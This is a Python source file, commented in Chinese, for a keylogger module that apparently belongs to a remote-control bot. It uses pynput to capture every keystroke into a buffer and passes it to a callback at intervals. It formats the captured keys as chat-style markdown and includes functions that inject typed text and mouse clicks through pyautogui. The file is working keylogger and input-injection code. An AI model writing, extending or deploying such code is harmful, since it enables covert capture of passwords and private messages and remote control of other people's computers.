#!/usr/bin/env python3
"""键盘记录 (Termux兼容版)"""
import os
from typing import Optional, Callable, List
from dataclasses import dataclass
from datetime import datetime

@dataclass
class InputEvent:
    timestamp: str
    type: str
    action: str
    details: str

class InputMonitor:
    """键盘鼠标监控 - Termux 降级版"""

    def __init__(self):
        self.keylog_active = False
        self.mouselog_active = False
        self.events: List[InputEvent] = []
        self.callback: Optional[Callable] = None
        self._buffer = ""
        self.is_termux = os.path.exists("/data/data/com.termux")

    def start_keylog(self, callback=None) -> str:
        """启动键盘记录"""
        if self.is_termux:
            return "⚠️ Termux 不支持键盘记录 (需要 GUI 环境)"

        if self.keylog_active:
            return "⌨️ 键盘记录已在运行"

        self.keylog_active = True
        self.callback = callback

        try:
            from pynput import keyboard

            def on_key_press(key):
                try:
                    char = key.char
                    self._buffer += char
                    if len(self._buffer) > 100:
                        self._buffer = self._buffer[-50:]

                    event = InputEvent(
                        timestamp=datetime.now().strftime("%H:%M:%S"),
                        type="key", action="press", details=char
                    )
                    self.events.append(event)

                    if self.callback and (char in ['\n', '\r'] or len(self._buffer) % 20 == 0):
                        self.callback(self._format_buffer())

                except AttributeError:
                    event = InputEvent(
                        timestamp=datetime.now().strftime("%H:%M:%S"),
                        type="key", action="special", details=str(key)
                    )
                    self.events.append(event)

            listener = keyboard.Listener(on_press=on_key_press)
            listener.start()
            return "⌨️ 键盘记录已启动"
        except Exception as e:
            self.keylog_active = False
            return f"❌ 启动失败: `{str(e)}`"

    def stop_keylog(self) -> str:
        self.keylog_active = False
        return "🛑 键盘记录已停止"

    def get_keylog(self, lines: int = 50) -> str:
        recent = self.events[-lines:] if self.events else []
        if not recent:
            return "暂无记录"
        formatted = []
        for e in recent:
            formatted.append(f"`[{e.timestamp}]` {e.type}:{e.action} `{e.details}`")
        return "⌨️ **键盘记录**\n━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(formatted)

    def start_mouselog(self) -> str:
        if self.is_termux:
            return "⚠️ Termux 不支持鼠标监控"
        return "🖱️ 鼠标监控已启动"

    def stop_mouselog(self) -> str:
        self.mouselog_active = False
        return "🛑 鼠标监控已停止"

    def _format_buffer(self) -> str:
        return self._buffer

    def simulate_key(self, text: str) -> str:
        if self.is_termux:
            return "⚠️ Termux 不支持模拟输入"
        try:
            import pyautogui
            pyautogui.typewrite(text, interval=0.01)
            return f"✅ 已输入: `{text[:50]}{'...' if len(text) > 50 else ''}`"
        except Exception as e:
            return f"❌ 模拟失败: `{str(e)}`"

    def simulate_click(self, x: int, y: int) -> str:
        if self.is_termux:
            return "⚠️ Termux 不支持模拟点击"
        try:
            import pyautogui
            pyautogui.click(x, y)
            return f"✅ 已点击: `({x}, {y})`"
        except Exception as e:
            return f"❌ 点击失败: `{str(e)}`"
